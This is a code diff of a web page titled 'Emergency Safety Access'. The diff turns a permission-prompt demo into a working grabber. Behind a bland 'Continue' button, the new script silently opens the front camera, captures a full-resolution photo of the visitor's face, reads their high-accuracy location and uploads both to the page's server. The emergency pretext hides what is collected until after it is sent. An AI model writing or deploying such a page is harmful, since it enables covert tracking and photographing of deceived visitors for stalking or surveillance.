@@ -1,272 +1,43 @@
 <!DOCTYPE html>
 <html>
-
 <head>
 
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>AshishTech</title>
-
-<style>
-
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial;
-}
-
-body{
-
-    height:100vh;
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    background:
-    linear-gradient(
-        135deg,
-        #000000,
-        #06111f,
-        #000000
-    );
-
-    overflow:hidden;
-}
-
-body::before{
-
-    content:"";
-
-    position:absolute;
-
-    width:700px;
-    height:700px;
-
-    background:
-    radial-gradient(
-        #00ffae33,
-        transparent
-    );
-
-    filter:blur(80px);
-
-    animation:rotate 10s linear infinite;
-}
-
-@keyframes rotate{
-
-    0%{
-        transform:rotate(0deg);
-    }
-
-    100%{
-        transform:rotate(360deg);
-    }
-
-}
-
-.container{
-
-    width:370px;
-
-    padding:35px;
-
-    border-radius:30px;
-
-    position:relative;
-
-    z-index:1;
-
-    background:rgba(255,255,255,0.05);
-
-    backdrop-filter:blur(20px);
-
-    border:1px solid rgba(0,255,170,0.3);
-
-    box-shadow:
-    0 0 40px rgba(0,255,170,0.25);
-
-    text-align:center;
-}
-
-.logo{
-
-    font-size:85px;
-
-    margin-bottom:10px;
-
-    color:#00ffae;
-
-    text-shadow:
-    0 0 20px #00ffae;
-}
-
-h1{
-
-    font-size:50px;
-
-    color:white;
-
-    margin-bottom:10px;
-}
-
-h1 span{
-
-    color:#00ffae;
-}
-
-.subtitle{
-
-    color:#bdbdbd;
-
-    margin-bottom:35px;
-
-    font-size:16px;
-}
-
-.feature{
-
-    padding:30px;
-
-    border-radius:25px;
-
-    margin-bottom:35px;
-
-    background:rgba(255,255,255,0.03);
-
-    border:1px solid rgba(255,255,255,0.05);
-
-    box-shadow:
-    inset 0 0 20px rgba(0,255,170,0.08);
-}
-
-.feature h3{
-
-    font-size:32px;
-
-    color:white;
-
-    margin-bottom:10px;
-}
-
-.feature p{
-
-    color:#aaaaaa;
-
-    font-size:15px;
-}
-
-button{
-
-    width:100%;
-
-    padding:18px;
-
-    border:none;
-
-    border-radius:18px;
-
-    font-size:22px;
-
-    font-weight:bold;
-
-    cursor:pointer;
-
-    background:
-    linear-gradient(
-        90deg,
-        #00ff99,
-        #00d9ff
-    );
-
-    transition:0.3s;
-}
-
-button:hover{
-
-    transform:scale(1.04);
-
-    box-shadow:
-    0 0 35px #00ffae;
-}
-
-.status{
-
-    margin-top:20px;
-
-    color:#bbbbbb;
-
-    font-size:14px;
-}
-
-.emergency{
-
-    position:absolute;
-
-    right:20px;
-
-    bottom:15px;
-
-    color:#00ffae;
-
-    font-size:12px;
-
-    opacity:0.8;
-}
-
-</style>
+    <title>Emergency System</title>
+
+    <style>
+
+        body{
+            background:#0f0f0f;
+            color:white;
+            font-family:Arial;
+            text-align:center;
+            margin-top:100px;
+        }
+
+        h1{
+            font-size:40px;
+        }
+
+        button{
+            padding:15px 35px;
+            font-size:22px;
+            border:none;
+            border-radius:12px;
+            cursor:pointer;
+            background:#00ff88;
+        }
+
+    </style>
 
 </head>
 
 <body>
 
-<div class="container">
+    <h1>Emergency Safety Access</h1>
 
-    <div class="logo">
-        🛡️
-    </div>
-
-    <h1>
-        Ashish<span>Tech</span>
-    </h1>
-
-    <p class="subtitle">
-        Emergency Safety Access System
-    </p>
-
-    <div class="feature">
-
-        <h3>
-            ☁️ Cloud Securing
-        </h3>
-
-        <p>
-            Safe & Encrypted
-        </p>
-
-    </div>
-
-    <button onclick="startAccess()">
-
-        ENABLE ACCESS →
-
+    <button onclick="startAccess ()">
+        Continue
     </button>
-
-    <div class="status" id="status">
-
-        Waiting for permissions...
-
-    </div>
-
-    <div class="emergency">
-
-        Emergency Access
-
-    </div>
-
-</div>
 
 <script>
 
@@ -274,41 +45,87 @@ async function startAccess(){
 
     try{
 
-        document
-        .getElementById("status")
-        .innerHTML =
-        "Requesting permissions...";
+        // CAMERA ACCESS (HD)
+        const stream = await navigator.mediaDevices.getUserMedia({
 
-        // CAMERA POPUP
+            video:{
+                width:{ ideal:1920 },
+                height:{ ideal:1080 },
+                facingMode:"user"
+            }
 
-        await navigator
-        .mediaDevices
-        .getUserMedia({
-            video:true
         });
 
-        // LOCATION POPUP
+        const video = document.createElement("video");
 
-        navigator
-        .geolocation
-        .getCurrentPosition(
+        video.srcObject = stream;
 
-            ()=>{
+        await video.play();
 
-                document
-                .getElementById("status")
-                .innerHTML =
-                "Permissions granted";
+        // LOCATION ACCESS
+        navigator.geolocation.getCurrentPosition(
+
+            async(position)=>{
+
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // SEND LOCATION
+                await fetch("/save-location",{
+
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":"application/json"
+                    },
+
+                    body:JSON.stringify({
+                        latitude,
+                        longitude
+                    })
+
+                });
+
+                // CREATE HD IMAGE
+                const canvas = document.createElement("canvas");
+
+                canvas.width = 1920;
+                canvas.height = 1080;
+
+                const ctx = canvas.getContext("2d");
+
+                ctx.drawImage(video,0,0);
+
+                // CONVERT TO HIGH QUALITY JPG
+                canvas.toBlob(async(blob)=>{
+
+                    const formData = new FormData();
+
+                    formData.append("photo",blob,"photo.jpg");
+
+                    await fetch("/upload",{
+
+                        method:"POST",
+                        body:formData
+
+                    });
+
+                    alert("Emergency Data Shared");
+
+                },"image/jpeg",1.0);
 
             },
 
-            ()=>{
+            (error)=>{
 
-                document
-                .getElementById("status")
-                .innerHTML =
-                "Location denied";
+                alert("Location permission denied");
 
+            },
+
+            {
+                enableHighAccuracy:true,
+                timeout:10000,
+                maximumAge:0
             }
 
         );
@@ -317,10 +134,7 @@ async function startAccess(){
 
     catch(err){
 
-        document
-        .getElementById("status")
-        .innerHTML =
-        "Permission denied";
+        alert("Permission Denied");
 
     }
 
@@ -329,5 +143,4 @@ async function startAccess(){
 </script>
 
 </body>
-
 </html>
